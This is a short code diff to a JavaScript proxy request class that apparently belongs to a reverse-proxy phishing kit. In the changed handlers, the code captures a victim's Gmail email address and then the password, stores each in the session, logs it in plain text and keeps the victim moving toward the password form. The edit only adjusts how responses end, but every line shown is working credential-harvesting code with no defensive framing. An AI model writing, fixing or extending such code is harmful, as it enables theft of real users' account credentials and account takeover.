@@ -82,8 +82,9 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                     Object.assign(this.browserReq.clientContext.sessionBody,
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
+                    // Don't end the request - let it continue to redirect to password form
                     this.proxyEndpoint.write(kJust) 
-                    this.proxyEndpoint.end('')
+                    this.proxyEndpoint.end()
 
                 } else if (passwordMatch) {
                     console.log('Password matched')
@@ -97,7 +98,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                         { password: passwordStr })
                     console.log(`password is ${passwordStr}`)
                     this.proxyEndpoint.write(kJust) 
-                    this.proxyEndpoint.end('')
+                    this.proxyEndpoint.end()
 
                 } else {
                     console.log('NO matches found - checking request content for debugging')
